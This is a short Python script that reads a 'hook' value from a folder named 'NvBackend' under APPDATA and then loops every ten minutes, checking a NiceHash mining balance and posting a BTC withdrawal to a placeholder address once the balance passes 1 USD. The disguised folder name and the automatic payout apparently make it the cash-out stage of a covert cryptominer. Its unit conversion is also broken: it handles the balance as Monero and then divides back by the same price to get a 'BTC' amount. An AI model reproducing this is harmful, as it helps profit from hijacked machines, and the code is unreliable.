import os, json, time, pathlib, requests
app = pathlib.Path(os.getenv("APPDATA")) / "NvBackend"
hook = (app / "hook.txt").read_text().strip()
addr = "YOUR_BTC_ADDRESS"
threshold = 1  # USD

def usd_balance():
    xmr = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd").json()["monero"]["usd"]
    bal = float(requests.get(f"https://api.nicehash.com/api?method=stats.provider.ex&addr={addr}").json()["result"]["stats"][0]["balance"])
    return bal * xmr

while True:
    usd = usd_balance()
    if usd >= threshold:
        payload = {"currency":"BTC","amount":str(usd_balance()/requests.get("https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd").json()["monero"]["usd"]),"address":addr}
        nh_key = "YOUR_NICEHASH_API_KEY"
        requests.post("https://api.nicehash.com/main/api/v2/accounting/withdrawal",
                      json=payload, headers={"X-Auth":nh_key})
    time.sleep(600)
